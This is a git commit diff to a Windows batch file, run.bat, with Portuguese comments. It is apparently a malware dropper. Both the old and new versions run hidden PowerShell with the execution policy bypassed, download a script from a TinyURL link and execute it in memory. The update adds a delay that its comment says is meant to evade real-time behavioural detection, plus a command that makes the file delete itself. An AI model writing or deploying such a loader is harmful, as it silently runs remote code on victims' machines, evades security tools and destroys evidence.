2a898706b98260c3a524bdd73f79f7de1aac12b2
19phantom04 <19phantom04@proton.me>
2026-03-28 19:52:30 +0000

    run.bat

--- run.bat
+++ run.bat
@@ -1,4 +1,7 @@
 @echo off
-:: Chama a PowerShell de forma indireta usando o teu novo TinyURL
-powershell -ep bypass -w hidden -c "iwr -useb https://tinyurl.com/3y8wnphh | iex"
-exit
+:: Aguarda 3 segundos para quebrar a análise de comportamento em tempo real
+ping -n 3 127.0.0.1 >nul
+:: Executa o script PowerShell usando o teu TinyURL atualizado
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IWR -useb https://tinyurl.com/3y8wnphh | IEX"
+:: Apaga-se a si próprio
+del "%~f0"
